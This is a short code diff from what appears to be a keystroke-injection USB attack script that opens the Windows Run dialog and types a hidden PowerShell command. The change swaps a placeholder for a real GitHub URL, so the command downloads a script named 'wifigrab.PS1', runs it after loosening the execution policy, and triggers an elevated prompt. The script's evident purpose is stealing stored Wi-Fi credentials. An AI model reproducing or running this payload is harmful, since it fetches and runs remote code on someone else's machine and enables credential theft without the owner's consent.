@@ -16,7 +16,7 @@ press("GUI r")
 delay(200)
 // this command will download the text and save as d.ps1 then run
 // if the script failed to run change the ExecPolicy to Bypass
-type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1")
+type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "https://raw.githubusercontent.com/eur1p3des/THC/main/Scripts/Wifi_Grab/wifigrab.PS1?token=ARG2YG45FMECMEUW2W2NUM3AU52HW" -o \d.ps1;\d.ps1")
 // Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
 // Delay 0.5 seconds to give the UAC prompt time to open.
 delay(500)
